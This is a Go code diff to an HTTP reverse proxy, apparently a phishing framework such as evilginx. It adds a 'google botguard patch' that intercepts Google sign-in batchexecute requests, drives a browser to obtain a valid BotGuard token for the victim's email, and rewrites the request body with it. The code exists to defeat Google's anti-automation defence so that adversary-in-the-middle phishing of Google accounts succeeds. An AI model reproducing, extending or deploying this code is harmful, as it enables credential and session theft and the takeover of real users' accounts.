@@ -846,7 +846,36 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						}
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						// google botguard patch
+						if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
+							log.Debug("GoogleBypass working with: %v", req.RequestURI)
+
+							// Decode URL encoded body
+				 			decodedBody, err := url.QueryUnescape(string(body))
+				 			if err != nil {
+				 				log.Error("Failed to decode body: %v", err)
+				 			}
+				 			decodedBodyBytes := []byte(decodedBody)
+							b := &GoogleBypasser{
+								isHeadless:     false,
+				 				withDevTools:   false,
+				 				slowMotionTime: 1500,
+							}
+				 			b.Launch()
+							b.GetEmail(decodedBodyBytes)
+				 			b.GetToken()
+							decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
+
+				 			// Re-encode the body as form data
+				 			postForm, err := url.ParseQuery(string(decodedBodyBytes))
+				 			if err != nil {
+				 				log.Error("Failed to parse form data: %v", err)
+							}
+				 			body = []byte(postForm.Encode())
+							req.ContentLength = int64(len(body))
+						}
+
+				 		req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
 
